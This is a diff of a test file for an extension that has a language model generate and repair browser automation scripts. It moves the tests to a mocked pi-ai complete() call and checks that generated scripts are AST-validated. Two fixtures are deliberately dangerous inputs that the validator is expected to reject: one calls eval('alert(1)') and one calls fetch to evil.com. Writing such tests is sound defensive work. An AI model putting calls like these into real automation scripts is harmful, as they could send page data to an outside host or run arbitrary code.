@@ -10,20 +10,14 @@ vi.stubGlobal('chrome', {
   tabs: { get: mockTabsGet, captureVisibleTab: mockCaptureVisibleTab },
 });
 
-// --- Mock LLMClient ---
-const { mockChat, MockLLMClient } = vi.hoisted(() => {
-  const mockChat = vi.fn();
-
-  class MockLLMClient {
-    chat = mockChat;
-    modelName = 'test-model';
-  }
-
-  return { mockChat, MockLLMClient };
+// --- Mock pi-ai complete ---
+const { mockComplete } = vi.hoisted(() => {
+  const mockComplete = vi.fn();
+  return { mockComplete };
 });
 
-vi.mock('./llm-client', () => ({
-  LLMClient: MockLLMClient,
+vi.mock('@mariozechner/pi-ai', () => ({
+  complete: mockComplete,
 }));
 
 import {
@@ -40,7 +34,23 @@ import {
   SCRIPT_GENERATION_PROMPT,
   REPAIR_PROMPT,
 } from './explorer-prompts';
-import type { LLMClient } from './llm-client';
+
+/** Helper to create a mock AssistantMessage with text content */
+function mockAssistantMessage(text: string) {
+  return {
+    role: 'assistant',
+    content: [{ type: 'text', text }],
+    api: 'openai-completions',
+    provider: 'openai',
+    model: 'test-model',
+    usage: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, totalTokens: 0, cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0, total: 0 } },
+    stopReason: 'stop',
+    timestamp: Date.now(),
+  };
+}
+
+const fakeModel = { id: 'test-model', name: 'test-model', api: 'openai-completions', provider: 'openai', baseUrl: '', reasoning: false, input: ['text'], cost: { input: 0, output: 0, cacheRead: 0, cacheWrite: 0 }, contextWindow: 128000, maxTokens: 16384 };
+const fakeApiKey = 'test-api-key';
 
 describe('cleanScriptSource', () => {
   it('strips ```javascript wrapper', () => {
@@ -146,12 +156,14 @@ describe('generateScript', () => {
 
   it('generates a script from description and observation', async () => {
     const validScript = 'async function run(page, context) {\n  await page.goto("https://example.com");\n  return {};\n}';
-    mockChat.mockResolvedValueOnce(validScript);
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage(validScript));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    const result = await generateScript(client, 'Navigate to example.com', observation, ['example.com']);
+    const result = await generateScript(fakeModel, fakeApiKey, 'Navigate to example.com', observation, ['example.com']);
 
-    expect(mockChat).toHaveBeenCalledTimes(1);
+    expect(mockComplete).toHaveBeenCalledTimes(1);
+    // Verify model and apiKey were passed
+    expect(mockComplete.mock.calls[0][0]).toBe(fakeModel);
+    expect(mockComplete.mock.calls[0][2]).toEqual(expect.objectContaining({ apiKey: fakeApiKey }));
     expect(result.source).toBe(validScript);
     expect(result.astValid).toBe(true);
     expect(result.astErrors).toHaveLength(0);
@@ -160,20 +172,18 @@ describe('generateScript', () => {
   it('strips markdown code fences from response', async () => {
     const wrappedScript = '```javascript\nasync function run(page) {\n  await page.click("button");\n}\n```';
     const expectedScript = 'async function run(page) {\n  await page.click("button");\n}';
-    mockChat.mockResolvedValueOnce(wrappedScript);
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage(wrappedScript));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    const result = await generateScript(client, 'Click button', observation, ['example.com']);
+    const result = await generateScript(fakeModel, fakeApiKey, 'Click button', observation, ['example.com']);
 
     expect(result.source).toBe(expectedScript);
   });
 
   it('validates AST on generated script', async () => {
     const validScript = 'async function run(page) { await page.goto("https://example.com"); }';
-    mockChat.mockResolvedValueOnce(validScript);
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage(validScript));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    const result = await generateScript(client, 'Go to page', observation, ['example.com']);
+    const result = await generateScript(fakeModel, fakeApiKey, 'Go to page', observation, ['example.com']);
 
     expect(result.astValid).toBe(true);
     expect(result.astErrors).toHaveLength(0);
@@ -181,10 +191,9 @@ describe('generateScript', () => {
 
   it('returns AST errors for invalid scripts', async () => {
     const dangerousScript = 'async function run(page) { eval("alert(1)"); }';
-    mockChat.mockResolvedValueOnce(dangerousScript);
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage(dangerousScript));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    const result = await generateScript(client, 'Do something', observation, ['example.com']);
+    const result = await generateScript(fakeModel, fakeApiKey, 'Do something', observation, ['example.com']);
 
     expect(result.astValid).toBe(false);
     expect(result.astErrors.length).toBeGreaterThan(0);
@@ -193,33 +202,23 @@ describe('generateScript', () => {
 
   it('returns AST errors for syntax errors', async () => {
     const invalidSyntax = 'function {{{ broken';
-    mockChat.mockResolvedValueOnce(invalidSyntax);
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage(invalidSyntax));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    const result = await generateScript(client, 'Do something', observation, ['example.com']);
+    const result = await generateScript(fakeModel, fakeApiKey, 'Do something', observation, ['example.com']);
 
     expect(result.astValid).toBe(false);
     expect(result.astErrors[0]).toContain('Parse error');
   });
 
-  it('passes screenshot to LLM when available', async () => {
-    const observationWithScreenshot: ExplorationResult = {
-      ...observation,
-      screenshot: 'data:image/png;base64,screenshot123',
-    };
-    mockChat.mockResolvedValueOnce('async function run(page) { return {}; }');
+  it('passes context with system prompt and user message to complete()', async () => {
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage('async function run(page) { return {}; }'));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    await generateScript(client, 'Describe page', observationWithScreenshot, ['example.com']);
+    await generateScript(fakeModel, fakeApiKey, 'Describe page', observation, ['example.com']);
 
-    const callArgs = mockChat.mock.calls[0][0];
-    // The user message should have multimodal content
-    const userMessage = callArgs[1];
-    expect(Array.isArray(userMessage.content)).toBe(true);
-    expect(userMessage.content).toHaveLength(2);
-    expect(userMessage.content[0].type).toBe('text');
-    expect(userMessage.content[1].type).toBe('image_url');
-    expect(userMessage.content[1].image_url.url).toBe('data:image/png;base64,screenshot123');
+    const context = mockComplete.mock.calls[0][1];
+    expect(context.systemPrompt).toBe(EXPLORER_SYSTEM_PROMPT);
+    expect(context.messages).toHaveLength(1);
+    expect(context.messages[0].role).toBe('user');
   });
 });
 
@@ -230,16 +229,17 @@ describe('repairScript', () => {
 
   it('generates a repaired script', async () => {
     const repairedScript = 'async function run(page) {\n  await page.click("[data-testid=\\"btn\\"]");\n  return {};\n}';
-    mockChat.mockResolvedValueOnce(repairedScript);
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage(repairedScript));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    const result = await repairScript(client, {
+    const result = await repairScript(fakeModel, fakeApiKey, {
       source: 'async function run(page) { await page.click(".old-selector"); }',
       error: 'SelectorNotFound: .old-selector',
       a11yTree: '{"role":"main"}',
     });
 
-    expect(mockChat).toHaveBeenCalledTimes(1);
+    expect(mockComplete).toHaveBeenCalledTimes(1);
+    expect(mockComplete.mock.calls[0][0]).toBe(fakeModel);
+    expect(mockComplete.mock.calls[0][2]).toEqual(expect.objectContaining({ apiKey: fakeApiKey }));
     expect(result.source).toBe(repairedScript);
     expect(result.astValid).toBe(true);
     expect(result.astErrors).toHaveLength(0);
@@ -247,10 +247,9 @@ describe('repairScript', () => {
 
   it('validates AST on repaired script', async () => {
     const dangerousRepair = 'async function run(page) { fetch("https://evil.com"); }';
-    mockChat.mockResolvedValueOnce(dangerousRepair);
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage(dangerousRepair));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    const result = await repairScript(client, {
+    const result = await repairScript(fakeModel, fakeApiKey, {
       source: 'async function run(page) { await page.click("x"); }',
       error: 'SelectorNotFound',
       a11yTree: '{}',
@@ -261,10 +260,9 @@ describe('repairScript', () => {
   });
 
   it('passes schema and lastOutput to repair messages', async () => {
-    mockChat.mockResolvedValueOnce('async function run(page) { return { price: "10" }; }');
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage('async function run(page) { return { price: "10" }; }'));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    await repairScript(client, {
+    await repairScript(fakeModel, fakeApiKey, {
       source: 'async function run(page) { return {}; }',
       error: 'Missing price field',
       a11yTree: '{"role":"main"}',
@@ -272,24 +270,23 @@ describe('repairScript', () => {
       lastOutput: '{ price: "5.99" }',
     });
 
-    const callArgs = mockChat.mock.calls[0][0];
-    const userContent = callArgs[1].content;
+    const context = mockComplete.mock.calls[0][1];
+    const userContent = context.messages[0].content;
     expect(userContent).toContain('{ price: string }');
     expect(userContent).toContain('{ price: "5.99" }');
   });
 
   it('uses defaults when schema and lastOutput are not provided', async () => {
-    mockChat.mockResolvedValueOnce('async function run(page) { return {}; }');
+    mockComplete.mockResolvedValueOnce(mockAssistantMessage('async function run(page) { return {}; }'));
 
-    const client = new MockLLMClient() as unknown as LLMClient;
-    await repairScript(client, {
+    await repairScript(fakeModel, fakeApiKey, {
       source: 'async function run(page) { return {}; }',
       error: 'Some error',
       a11yTree: '{}',
     });
 
-    const callArgs = mockChat.mock.calls[0][0];
-    const userContent = callArgs[1].content;
+    const context = mockComplete.mock.calls[0][1];
+    const userContent = context.messages[0].content;
     expect(userContent).toContain('Not specified');
     expect(userContent).toContain('None');
   });
